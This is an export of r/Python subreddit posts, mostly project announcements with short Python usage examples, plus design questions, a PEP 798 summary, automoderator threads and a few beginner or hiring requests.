1m6bzol,KWRepr: Customizable Keyword-Style __repr__ Generator for Python Classes,ZrekryuDev,5,7,2025-07-22 11:50:59,https://www.reddit.com/r/Python/comments/1m6bzol/kwrepr_customizable_keywordstyle_repr_generator/,"KWRepr ‚Äì keyword-style __repr__ for Python classes

## What my project does

KWRepr automatically adds a `__repr__` method to your classes that outputs clean, keyword-style representations like:

`User(id=1, name='Alice')`

It focuses purely on customizable `__repr__` generation. Inspired by the `@dataclass` repr feature but with more control and flexibility.

## Target audience

Python developers who want simple, customizable `__repr__` with control over visible fields. Supports both `__dict__` and `__slots__` classes.

## Comparison

Unlike `@dataclass` and `attrs`, KWRepr focuses only on keyword-style `__repr__` generation with flexible field selection.

## Features

- Works with `__dict__` and `__slots__` classes  
- Excludes private fields (starting with `_`) by default  
- Choose visible fields: include or exclude (can‚Äôt mix both)
- Add computed fields via callables  
- Format field output (e.g., `.2f`)  
- Use as decorator or manual injection  
- Extendable: implement custom field extractors by subclassing `BaseFieldExtractor` in `kwrepr/field_extractors/`

## Basic Usage

```python
from kwrepr import apply_kwrepr

@apply_kwrepr
class User:
    def __init__(self, id, name):
        self.id = id
        self.name = name

print(User(1, ""Alice""))
# User(id=1, name='Alice')
```

For more examples and detailed usage, see the README.

## Installation
Soon on PyPi.
For now, clone the repository and run `pip install .`

GitHub Repository: [kwrepr](https://github.com/Zrekryu/kwrepr)"
1m6bdzl,Basic SLAM with LiDAR,Mbird1258,0,0,2025-07-22 11:19:17,https://www.reddit.com/r/Python/comments/1m6bdzl/basic_slam_with_lidar/,"# What My Project Does

Uses an RPLiDAR C1 alongside a custom rc car to perform Simultaneous Localization and Mapping. 

# Target Audience

Anyone interested in lidar sensors or self-driving. 

# Comparison

Not a particularly novel project due to hardware issues, but still a good proof of concept. 

# Other Details

More details on my blog:¬†[https://matthew-bird.com/blogs/LiDAR%20Car.html](https://matthew-bird.com/blogs/LiDAR%20Car.html)

GitHub Repo:¬†[https://github.com/mbird1258/LiDAR-Car/](https://github.com/mbird1258/LiDAR-Car/)"
1m6773a,My company finally got Claude-Code!,None,0,4,2025-07-22 06:57:50,https://www.reddit.com/r/Python/comments/1m6773a/my_company_finally_got_claudecode/,"Hey everyone,

My company recently got access to **Claude-Code for development**. I'm pretty excited about it.

Up until now, we've mostly been using **Gemini-CLI**, but it was the free version. While it was okay, I honestly felt it wasn't quite hitting the mark when it came to actually **writing and iterating on code**.

We use **Gemini 2.5-Flash** for a lot of our operational tasks, and it's actually fantastic for that kind of work ‚Äì super efficient. But for direct development, it just wasn't quite the right fit for our needs.

So, getting Claude-Code means I'll finally get to experience a more complete **code writing, testing, and refining cycle** with an AI. I'm really looking forward to seeing how it changes my workflow.

  
BTW,



My company is fairly small, and we don't have a huge dev team. So our projects are usually on the smaller side too. For me, getting familiar with projects and adding new APIs usually isn't too much of a challenge.

But it got me wondering, for those of you working at bigger companies or on larger projects, **how do you handle this kind of integration or project understanding with AI tools?** Any tips or experiences to share?"
1m64xh8,"I just finished building Boron, a CLI-based schema-bound JSON manager. Please check it out! Thanks!",None,0,10,2025-07-22 04:40:41,https://www.reddit.com/r/Python/comments/1m64xh8/i_just_finished_building_boron_a_clibased/,"# What does Boron do?

* Uses schemas to define structure
* Supports form-driven creation and updates
* Lets you query and delete fields using clean syntax ‚Äî no for-loops, no nested key-chasing
* Works entirely from the command line
* Requires no database, no dependencies

# Use cases

* Prototyping
* Small scale projects requiring structured data storage
* Teaching purposes

# Features:

* Form-styled instance creation and update systems for data and structural integrity
* Select or delete specific fields directly from JSON
* Modify deeply nested values cleanly
* 100% local, lightweight, zero bloat
* **It's open source**

# Comparison with Existing Tools

|Capability|`jq`|`fx`|gron|**Boron**|
|:-|:-|:-|:-|:-|
|Command-line interface (CLI)|‚úÖ|‚úÖ|‚úÖ|‚úÖ|
|Structured field querying|‚úÖ|‚úÖ|‚úÖ|‚úÖ|
|Schema validation per file|‚ùå|‚ùå|‚ùå|‚úÖ|
|Schema-bound data creation|‚ùå|‚ùå|‚ùå|‚úÖ|
|Schema-bound data updating|‚ùå|‚ùå|‚ùå|‚úÖ|
|Delete fields without custom scripting|‚ùå|‚ùå|‚ùå|‚úÖ|
|Modify deeply nested fields via CLI|‚úÖ (complex)|‚úÖ (GUI only)|‚ùå|‚úÖ|
|Works without any runtime or server|‚úÖ|‚úÖ|‚úÖ|‚úÖ|

None of the existing tools aim to enforce structure or make **creation and updates ergonomic** ‚Äî Boron is built specifically for that.

# [Link to GitHub repository](https://github.com/RaktimJS/boron)

I‚Äôd love your feedback ‚Äî feature ideas, edge cases, even brutal critiques. If this saves you from another `if key in dictionary` nightmare, **PLEEEEEEASE** give it a star! ‚≠ê

Happy to answer any technical questions or brainstorm features you‚Äôd like to see. Let‚Äôs make Boron loud! üöÄ"
1m607oi,PEP 798 ‚Äì Unpacking in Comprehensions,kirara0048,520,43,2025-07-22 00:46:29,https://www.reddit.com/r/Python/comments/1m607oi/pep_798_unpacking_in_comprehensions/,"PEP 798 ‚Äì Unpacking in Comprehensions

[https://peps.python.org/pep-0798/](https://peps.python.org/pep-0798/)

# Abstract

This PEP proposes extending list, set, and dictionary comprehensions, as well as generator expressions, to allow unpacking notation (`*` and `**`) at the start of the expression, providing a concise way of combining an arbitrary number of iterables into one list or set or generator, or an arbitrary number of dictionaries into one dictionary, for example:

    [*it for it in its]  # list with the concatenation of iterables in 'its'
    {*it for it in its}  # set with the union of iterables in 'its'
    {**d for d in dicts} # dict with the combination of dicts in 'dicts'
    (*it for it in its)  # generator of the concatenation of iterables in 'its'"
1m5z8b2,Tuesday Daily Thread: Advanced questions,AutoModerator,1,0,2025-07-22 00:00:29,https://www.reddit.com/r/Python/comments/1m5z8b2/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1m5weir,Best way to start picking up small gigs?,fabriqus,0,8,2025-07-21 22:00:21,https://www.reddit.com/r/Python/comments/1m5weir/best_way_to_start_picking_up_small_gigs/,"I have a few years experience, broad but not terribly deep. Feel like I'm ready to start picking up small gigs for pocket money. Not planning to make a career out of it by any stretch, but def interested in picking up some pocket change here and there. 

Many thanks in advance for any suggestions 

  
Joe"
1m5t7t1,Python in 90 minutes (for absolute beginners),miniaturegnome,0,6,2025-07-21 19:57:52,https://www.reddit.com/r/Python/comments/1m5t7t1/python_in_90_minutes_for_absolute_beginners/,I‚Äôm running a fun intro-to-coding FREE webinar for absolute beginners 90 minutes. Learn to code in python from scratch and build something cool. Let me know if anyone would be interested. DM me to find out more.
1m5ri4n,üö® Update on Dispytch: Just Got Dynamic Topics ‚Äî Event Handling Leveled Up,e1-m,0,5,2025-07-21 18:53:25,https://www.reddit.com/r/Python/comments/1m5ri4n/update_on_dispytch_just_got_dynamic_topics_event/,"Hey folks, quick update!  
I just shipped a new version of [**Dispytch**](https://github.com/e1-m/dispytch) ‚Äî async Python framework for building event-driven services.

# üöÄ What Dispytch Does

Dispytch makes it easy to build services that react to events ‚Äî whether they're coming from Kafka, RabbitMQ, Redis or some other broker. You define event types as Pydantic models and wire up handlers with dependency injection. Dispytch handles validation, retries, and routing out of the box, so you can focus on the logic.

# ‚öîÔ∏è Comparison

|Framework|Focus|Notes|
|:-|:-|:-|
|Celery|Task queues|Great for backgroud processing|
|Faust|Kafka streams|Powerful, but streaming-centric|
|Nameko|RPC services|Sync-first, heavy|
|FastAPI|HTTP APIs|Not for event processing|
|FastStream|Stream pipelines|Built around streams‚Äîgreat for  data pipelines.|
|**Dispytch**|Event handling|Event-centric and reactive, designed for clear event-driven services.|

# ‚úçÔ∏è Quick API Example

# Handler

    user_events.handler(topic='user_events', event='user_registered')
    async def handle_user_registered(
            event: Event[UserCreatedEvent],
            user_service: Annotated[UserService, Dependency(get_user_service)]
    ):
        user = event.body.user
        timestamp = event.body.timestamp
    
        print(f""[User Registered] {user.id} - {user.email} at {timestamp}"")
    
        await user_service.do_smth_with_the_user(event.body.user)

# Emitter

    async def example_emit(emitter):
       await emitter.emit(
           UserRegistered(
               user=User(
                   id=str(uuid.uuid4()),
                   email=""example@mail.com"",
                   name=""John Doe"",
               ),
               timestamp=int(datetime.now().timestamp()),
           )
       )

# üîÑ What‚Äôs New?

üßµ **Redis Pub/Sub support**  
You can now plug Redis into Dispytch and start consuming events without spinning up Kafka or RabbitMQ. Perfect for lightweight setups.

üß© **Dynamic Topics**  
Handlers can now use topic segments as function arguments ‚Äî e.g., match `""user.{user_id}.notification""` and get `user_id` injected automatically. Clean and type-safe thanks to Pydantic validation.

üëÄ Try it out:

    uv add dispytch

üìö Docs and examples in the repo: [https://github.com/e1-m/dispytch](https://github.com/e1-m/dispytch)

Feedback, bug reports, feature requests ‚Äî all welcome. Still early, still evolving üöß

Thanks for checking it out!"
1m5q8ao,I turned my Git workflow into a little RPG with levels and achievements,Ok_Blackberry7880,50,0,2025-07-21 18:05:47,https://www.reddit.com/r/Python/comments/1m5q8ao/i_turned_my_git_workflow_into_a_little_rpg_with/,"Hey everyone,

I built a little CLI tool to make my daily Git routine more fun. It adds XP, levels, and achievements to your¬†commit¬†and¬†push¬†commands.

* **What it does**: A Python CLI that adds a non-intrusive RPG layer to your Git workflow.
* **Target Audience**: Students, hobbyists, or any developer who wants a little extra motivation. It's a fun side-project, not a critical enterprise tool.
* **Why it's different**: It's purely terminal-based (no websites), lightweight, and hooks into your existing workflow without ever slowing you down.

Had a lot of fun building this and would love to hear what you think!

**GitHub Repo:**  
[DeerYang/git-gamify: A command-line tool that turns your Git workflow into a fun RPG. Level up, unlock achievements, and make every commit rewarding.](https://github.com/DeerYang/git-gamify)"
1m5m4gz,Which is better for a text cleaning pipeline in Python: unified function signatures vs. custom ones?,No_Owl_56,13,6,2025-07-21 15:34:35,https://www.reddit.com/r/Python/comments/1m5m4gz/which_is_better_for_a_text_cleaning_pipeline_in/,"I'm building a configurable **text cleaning pipeline** in Python and I'm trying to decide between two approaches for implementing the cleaning functions. I‚Äôd love to hear your thoughts from a **design, maintainability, and performance** perspective.

# Version A: Custom Function Signatures with Lambdas

Each cleaning function only accepts the arguments it needs. To make the pipeline runner generic, I use **lambdas** in a registry to standardize the interface.

    # Registry with lambdas to normalize signatures
    CLEANING_FUNCTIONS = {
        ""to_lowercase"": lambda contents, metadatas, **_: (to_lowercase(contents), metadatas),
        ""remove_empty"": remove_empty,  # Already matches pipeline format
    }

    # Pipeline runner
    for method, options in self.cleaning_config.items():
                cleaning_function = CLEANING_FUNCTIONS.get(method)
                if not cleaning_function:
                    continue
                if isinstance(options, dict):
                    contents, metadatas = cleaning_function(contents, metadatas, **options)
                elif options is True:
                    contents, metadatas = cleaning_function(contents, metadatas)

# Version B: Unified Function Signatures

All functions follow the same signature, even if they don‚Äôt use all arguments:

    def to_lowercase(contents, metadatas, **kwargs):
        return [c.lower() for c in contents], metadatas

    CLEANING_FUNCTIONS = {
        ""to_lowercase"": to_lowercase,
        ""remove_empty"": remove_empty,
    }

# My Questions

* Which version would you prefer in a real-world codebase?
* Is passing unused arguments (like metadatas) a bad practice in this case?
* Have you used a better pattern for configurable text/data transformation pipelines?

Any feedback is appreciated ‚Äî thank you!"
1m5lm8e,Is it ok to use Pandas in Production code?,Wooden_Bug_3528,147,107,2025-07-21 15:15:32,https://www.reddit.com/r/Python/comments/1m5lm8e/is_it_ok_to_use_pandas_in_production_code/,"Hi I have recently pushed a code, where I was using pandas, and got a review saying that I should not use pandas in production. Would like to check others people opnion on it.

For context, I have used pandas on a code where we scrape page to get data from html tables, instead of writing the parser myself I used pandas as it does this job seamlessly.

  
Would be great to get different views on it. tks."
1m5jcot,Prefered way to structure polars expressions in large project?,Beginning-Fruit-1397,32,11,2025-07-21 13:46:44,https://www.reddit.com/r/Python/comments/1m5jcot/prefered_way_to_structure_polars_expressions_in/,"I love polars. However once your project hit a certain size, you end up with a few ""core"" dataframe schemas / columns re-used across the codebase, and intermediary transformations who can sometimes be lengthy.
I'm curious about what are other ppl approachs to organize and split up things.

The first point I would like to adress is the following:
given a certain dataframe whereas you have a long transformation chains, do you prefer to split things up in a few functions to separate steps, or centralize everything?
For example, which way would you prefer?
```
# This?
def chained(file: str, cols: list[str]) -> pl.DataFrame:
    return (
        pl.scan_parquet(file)
        .select(*[pl.col(name) for name in cols])
        .with_columns()
        .with_columns()
        .with_columns()
        .group_by()
        .agg()
        .select()
        .with_columns()
        .sort(""foo"")
        .drop()
        .collect()
        .pivot(""foo"")
    )


# Or this?

def _fetch_data(file: str, cols: list[str]) -> pl.LazyFrame:
    return (
        pl.scan_parquet(file)
        .select(*[pl.col(name) for name in cols])
    )
def _transfo1(df: pl.LazyFrame) -> pl.LazyFrame:
    return df.select().with_columns().with_columns().with_columns()

def _transfo2(df: pl.LazyFrame) -> pl.LazyFrame:
    return df.group_by().agg().select()


def _transfo3(df: pl.LazyFrame) -> pl.LazyFrame:
    return df.with_columns().sort(""foo"").drop()

def reassigned(file: str, cols: list[str]) -> pl.DataFrame:
    df = _fetch_data(file, cols)
    df = _transfo1(df) # could reassign new variable here
    df = _transfo2(df)
    df = _transfo3(df)
    return df.collect().pivot(""foo"")
```

IMO I would go with a mix of the two, by merging the transfo funcs together. 
So i would have 3 funcs, one to get the data, one to transform it, and a final to execute the compute and format it.


My second point adresses the expressions. writing hardcoded strings everywhere is error prone.
I like to use StrEnums pl.col(Foo.bar), but it has it's limits too.
I designed an helper class to better organize it:

```
from dataclasses import dataclass, field

import polars as pl

@dataclass(slots=True)
class Col[T: pl.DataType]:
    name: str
    type: T

    def __call__(self) -> pl.Expr:
        return pl.col(name=self.name)

    def cast(self) -> pl.Expr:
        return pl.col(name=self.name).cast(dtype=self.type)

    def convert(self, col: pl.Expr) -> pl.Expr:
        return col.cast(dtype=self.type).alias(name=self.name)

    @property
    def field(self) -> pl.Field:
        return pl.Field(name=self.name, dtype=self.type)
    
@dataclass(slots=True)
class EnumCol(Col[pl.Enum]):
    type: pl.Enum = field(init=False)
    values: pl.Series

    def __post_init__(self) -> None:
        self.type = pl.Enum(categories=self.values)

# Then I can do something like this:
@dataclass(slots=True, frozen=True)
class Data:
    date = Col(name=""date"", type=pl.Date())
    open = Col(name=""open"", type=pl.Float32())
    high = Col(name=""high"", type=pl.Float32())
    low = Col(name=""low"", type=pl.Float32())
    close = Col(name=""close"", type=pl.Float32())
    volume = Col(name=""volume"", type=pl.UInt32())
data = Data()
```

I get autocompletion and more convenient dev experience (my IDE infer data.open as Col[pl.Float32]), but at the same time now it add a layer to readability and new responsibility concerns.

Should I now centralize every dataframe function/expression involving those columns in this class or keep it separate? What about other similar classes?
Example in a different module
```
import frames.cols as cl <--- package.module where data instance lives
...
@dataclass(slots=True, frozen=True)
class Contracts:
    bid_price = cl.Col(name=""bidPrice"", type=pl.Float32())
    ask_price = cl.Col(name=""askPrice"", type=pl.Float32())
........
    def get_mid_price(self) -> pl.Expr:
        return (
            self.bid_price()
            .add(other=self.ask_price())
            .truediv(other=2)
            .alias(name=cl.data.close.name) # module.class.Col.name <----
        )
```

I still haven't found a satisfying answer, curious to hear other opinions!"
1m59s5f,Sifaka: Simple AI text improvement using research-backed critique (open source),Low-Sandwich-7607,0,3,2025-07-21 04:45:40,https://www.reddit.com/r/Python/comments/1m59s5f/sifaka_simple_ai_text_improvement_using/,"## What My Project Does

[Sifaka](https://github.com/sifaka-ai/sifaka ) is an open-source Python framework that adds reflection and reliability to large language model (LLM) applications. The core functionality includes:

- **7 research-backed critics** that automatically evaluate LLM outputs for quality, accuracy, and reliability
- **Iterative improvement engine** that uses critic feedback to refine content through multiple rounds
- **Validation rules system** for enforcing custom quality standards and constraints
- **Built-in retry mechanisms** with exponential backoff for handling API failures
- **Structured logging and metrics** for monitoring LLM application performance

The framework integrates seamlessly with popular LLM APIs (OpenAI, Anthropic, etc.) and provides both synchronous and asynchronous interfaces for production workflows.

## Target Audience

Sifaka is (eventually) intended for **production LLM applications where reliability and quality are critical**. Primary use cases include:

- **Production AI systems** that need consistent, high-quality outputs
- **Content generation pipelines** requiring automated quality assurance
- **AI-powered workflows** in enterprise environments
- **Research applications** studying LLM reliability and improvement techniques

The framework includes comprehensive error handling, making it suitable for mission-critical applications rather than just experimentation.

## Comparison

While there are several LLM orchestration tools available, Sifaka differentiates itself through:

**vs. LangChain/LlamaIndex:**

- Focuses specifically on output quality and reliability rather than general orchestration
- Provides research-backed evaluation metrics instead of generic chains
- Lighter weight with minimal dependencies for production deployment

**vs. Guardrails AI:**

- Offers iterative improvement rather than just validation/rejection
- Includes multiple critic perspectives instead of single-rule validation
- Designed for continuous refinement workflows

**vs. Custom validation approaches:**

- Provides pre-built, research-validated critics out of the box
- Handles the complexity of iterative improvement loops automatically
- Includes production-ready monitoring and error handling

**Key advantages:**

- Research-backed approach with peer-reviewed critic methodologies
- Async-first design optimized for high-throughput production environments
- Minimal performance overhead with intelligent caching strategies

-----

I‚Äôd love to get y‚Äôall‚Äôs thoughts and feedback on the project! I‚Äôm also looking for contributors, especially those with experience in LLM evaluation or production AI systems."
1m55jmj,Timder Bot Swipe and Bumble,Impossible_Bag_7672,0,9,2025-07-21 01:09:37,https://www.reddit.com/r/Python/comments/1m55jmj/timder_bot_swipe_and_bumble/,"Hi
I am looking for someone to program a Tinder bot with Selenium for auto swipe function, pump bot function to get more matches. As well as for Bumble too. Gladly in Python or other languages."
1m54hyp,Introducing async_obj: a minimalist way to make any function asynchronous,gunakkoc,23,6,2025-07-21 00:19:06,https://www.reddit.com/r/Python/comments/1m54hyp/introducing_async_obj_a_minimalist_way_to_make/,"If you are tired of writing the same messy threading or `asyncio` code just to run a function in the background, here is my minimalist solution.

Github: [https://github.com/gunakkoc/async\_obj](https://github.com/gunakkoc/async_obj)

Now also available via `pip`: `pip install async_obj`

# What My Project Does

`async_obj` allows running any function asynchronously. It creates a class that pretends to be whatever object/function that is passed to it and intercepts the function calls to run it in a dedicated thread. It is essentially a two-liner. Therefore, async\_obj enables async operations while minimizing the code-bloat, requiring no changes in the code structure, and consuming nearly no extra resources.

Features:

* Collect results of the function
* In case of exceptions, it is properly raised and only when result is being collected.
* Can check for completion OR wait/block until completion.
* Auto-complete works on some IDEs

# Target Audience

I am using this to orchestrate several devices in a robotics setup. I believe it can be useful for anyone who deals with blocking functions such as:

* Digital laboratory developers
* Database users
* Web developers
* Data scientist dealing with large data or computationally intense functions
* When quick prototyping of async operations is desired

# Comparison

One can always use `multithreading` library. At minimum it will require wrapping the function inside another function to get the returned result. Handling errors is less controllable. Same with `ThreadPoolExecutor`. Multiprocessing is only worth the hassle if the aim is to distribute a computationally expensive task (i.e., running on multiple cores). Asyncio is more comprehensive but requires a lot of modification to the code with different keywords/decorators. I personally find it not so elegant.

# Examples

* Run a function asynchronous and check for completion. Then collect the result.

&#8203;

    from async_obj import async_obj
    from time import sleep
    
    def dummy_func(x:int):
        sleep(3)
        return x * x
    
    #define the async version of the dummy function
    async_dummy = async_obj(dummy_func)
    
    print(""Starting async function..."")
    async_dummy(2)  # Run dummy_func asynchronously
    print(""Started."")
    
    while True:
        print(""Checking whether the async function is done..."")
        if async_dummy.async_obj_is_done():
            print(""Async function is done!"")
            print(""Result: "", async_dummy.async_obj_get_result(), "" Expected Result: 4"")
            break
        else:
            print(""Async function is still running..."")
            sleep(1)

* Alternatively, block until the function is completed, also retrieve any results.

&#8203;

    print(""Starting async function..."")
    async_dummy(4)  # Run dummy_func asynchronously
    print(""Started."")
    print(""Blocking until the function finishes..."")
    result = async_dummy.async_obj_wait()
    print(""Function finished."")
    print(""Result: "", result, "" Expected Result: 16"")

* Raise propagated exceptions, whenever the result is requested either with `async_obj_get_result()` or with `async_obj_wait()`.

&#8203;

    print(""Starting async function with an exception being expected..."")
    async_dummy(None) # pass an invalid argument to raise an exception
    print(""Started."")
    print(""Blocking until the function finishes..."")
    try:
        result = async_dummy.async_obj_wait()
    except Exception as e:
        print(""Function finished with an exception: "", str(e))
    else:
        print(""Function finished without an exception, which is unexpected."")

*  Same functionalities are available for functions within class instances.

&#8203;

    class dummy_class:
        x = None
    
        def __init__(self):
            self.x = 5
    
        def dummy_func(self, y:int):
            sleep(3)
            return self.x * y
    
    dummy_instance = dummy_class()
    #define the async version of the dummy function within the dummy class instance
    async_dummy = async_obj(dummy_instance)
    
    print(""Starting async function..."")
    async_dummy.dummy_func(4)  # Run dummy_func asynchronously
    print(""Started."")
    print(""Blocking until the function finishes..."")
    result = async_dummy.async_obj_wait()
    print(""Function finished."")
    print(""Result: "", result, "" Expected Result: 20"")"
1m543e5,Monday Daily Thread: Project ideas!,AutoModerator,10,1,2025-07-21 00:00:32,https://www.reddit.com/r/Python/comments/1m543e5/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1m5157j,UA-Extract - Easy way to keep user-agent parsing updated,expiredUserAddress,1,16,2025-07-20 21:49:50,https://www.reddit.com/r/Python/comments/1m5157j/uaextract_easy_way_to_keep_useragent_parsing/,"Hey folks! I‚Äôm excited to share UA-Extract, a Python library that makes user agent parsing and device detection a breeze, with a special focus on keeping regexes fresh for accurate detection of the latest browsers and devices. After my first post got auto-removed, I‚Äôve added the required sections to give you the full scoop. Let‚Äôs dive in!

**What My Project Does**

UA-Extract is a fast and reliable Python library for parsing user agent strings to identify browsers, operating systems, and devices (like mobiles, tablets, TVs, or even gaming consoles). It‚Äôs built on top of the device\_detector library and uses a massive, regularly updated user agent database to handle thousands of user agent strings, including obscure ones.

The star feature? **Super easy regex updates**. New devices and browsers come out all the time, and outdated regexes can misidentify them. UA-Extract lets you update regexes with a single line of code or a CLI command, pulling the latest patterns from the [Matomo Device Detector](https://github.com/matomo-org/device-detector) project. This ensures your app stays accurate without manual hassle. Plus, it‚Äôs optimized for speed with in-memory caching and supports the regex module for faster parsing.

Here‚Äôs a quick example of updating regexes:

    from ua_extract import Regexes
    Regexes().update_regexes()  # Fetches the latest regexes

Or via CLI:

    ua_extract update_regexes

You can also parse user agents to get detailed info:

    from ua_extract import DeviceDetector
    
    ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57 EtsyInc/5.22 rv:52200.62.0'
    device = DeviceDetector(ua).parse()
    print(device.os_name())           # e.g., iOS
    print(device.device_model())      # e.g., iPhone
    print(device.secondary_client_name())  # e.g., EtsyInc

For faster parsing, use SoftwareDetector to skip bot and hardware detection, focusing on OS and app details.

**Target Audience**

UA-Extract is for Python developers building:

* Web analytics tools: Track user devices and browsers for insights.
* Personalized web experiences: Tailor content based on device or OS.
* Debugging tools: Identify device-specific issues in web apps.
* APIs or services: Need reliable, up-to-date device detection in production.

It‚Äôs ideal for both production environments (e.g., high-traffic web apps needing accurate, fast parsing) and prototyping (e.g., testing user agent detection for a new project). If you‚Äôre a hobbyist experimenting with user agent parsing or a company running large-scale analytics, UA-Extract‚Äôs easy regex updates and speed make it a great fit.

**Comparison**

UA-Extract stands out from other user agent parsers like ua-parser or user-agents in a few key ways:

* **Effortless Regex Updates:** Unlike ua-parser, which requires manual regex updates or forking the repo, UA-Extract offers one-line code (Regexes().update\_regexes()) or CLI (ua\_extract update\_regexes) to fetch the latest regexes from Matomo. This is a game-changer for staying current without digging through Git commits.
* **Built on Matomo‚Äôs Database:** Leverages the comprehensive, community-maintained regexes from Matomo Device Detector, which supports a wider range of devices (including niche ones like TVs and consoles) compared to smaller libraries.
* **Performance Options:** Supports the regex module and CSafeLoader (PyYAML with --with-libyaml) for faster parsing, plus a lightweight SoftwareDetector mode for quick OS/app detection‚Äîsomething not all libraries offer.
* **Pythonic Design:** As a port of the Universal Device Detection library (cloned from [thinkwelltwd/device\_detector](https://github.com/thinkwelltwd/device_detector)), it‚Äôs tailored for Python with clean APIs, unlike some PHP-based alternatives like Matomo‚Äôs core library.

However, UA-Extract requires Git for CLI-based regex updates, which might be a minor setup step compared to fully self-contained libraries. It‚Äôs also a newer project, so it may not yet have the community size of ua-parser.

**Get Started üöÄ**

Install UA-Extract with:

    pip install ua_extract



**Try parsing a user agent:**

    from ua_extract import SoftwareDetector
    
    ua = 'Mozilla/5.0 (Linux; Android 6.0; 4Good Light A103 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36'
    device = SoftwareDetector(ua).parse()
    print(device.client_name())  # e.g., Chrome
    print(device.os_version())   # e.g., 6.0

**Why I Built This üôå**

I got tired of user agent parsers that made it a chore to keep regexes up-to-date. New devices and browsers break old regexes, and manually updating them is a pain. UA-Extract solves this by making regex updates a core, one-step feature, wrapped in a fast, Python-friendly package. It‚Äôs a clone of [thinkwelltwd/device\_detector](https://github.com/thinkwelltwd/device_detector) with tweaks to prioritize seamless updates.

Let‚Äôs Connect! üó£Ô∏è

**Repo:** [github.com/pranavagrawal321/UA-Extract](https://github.com/pranavagrawal321/UA-Extract)

**Contribute:** Got ideas or bug fixes? Pull requests are welcome!

**Feedback:** Tried UA-Extract? Let me know how it handles your user agents or what features you‚Äôd love to see.

Thanks for checking out UA-Extract! Let‚Äôs make user agent parsing easy and always up-to-date! üòé"
1m4yczu,I need information,Sad-Quote-9,0,5,2025-07-20 19:54:16,https://www.reddit.com/r/Python/comments/1m4yczu/i_need_information/,"Hello I would like to learn to code in Python, I have no experience with coding so I would like to have site or video references that could teach me.
By the way I downloaded Pycharm"
1m4rk7w,Anyone interested,MAJESTIC-728,0,8,2025-07-20 15:22:18,https://www.reddit.com/r/Python/comments/1m4rk7w/anyone_interested/,"I made a discord server for beginners programmers 
So we can chat and discuss with each other 
If anyone of you are interested then feel free to  dm me anytime."
1m4qz35,Using asyncio for cooperative concurrency,oldendude,13,25,2025-07-20 14:57:47,https://www.reddit.com/r/Python/comments/1m4qz35/using_asyncio_for_cooperative_concurrency/,"I am writing a shell in Python, and recently posted a question about concurrency options (https://www.reddit.com/r/Python/comments/1lyw6dy/pythons\_concurrency\_options\_seem\_inadequate\_for). That discussion was really useful, and convinced me to pursue the use of asyncio.

If my shell has two jobs running, each of which does IO, then async will ensure that both jobs make progress.

But what if I have jobs that are not IO bound? To use an admittedly far-fetched example, suppose one job is solving the 20 queens problem (which can be done as a marcel one-liner), and another one is solving the 21 queens problem. These jobs are CPU-bound.  If both jobs are going to make progress, then each one occasionally needs to yield control to the other.

My question is how to do this. The only thing I can figure out from the async documentation is asyncio.sleep(0). But this call is quite expensive, and doing it often (e.g. in a loop of the N queens implementation) would kill performance. An alternative is to rely on signal.alarm() to set a flag that would cause the currently running job to yield (by calling asyncio.sleep(0)). I would think that there should or could be some way to yield that is much lower in cost. (E.g., Swift has Task.yield(), but I don't know anything about it's performance.)

By the way, an unexpected oddity of asyncio.sleep(n) is that n has to be an integer. This means that the time slice for each job cannot be smaller than one second. Perhaps this is because frequent switching among asyncio tasks is inherently expensive? I don't know enough about the implementation to understand why this might be the case."
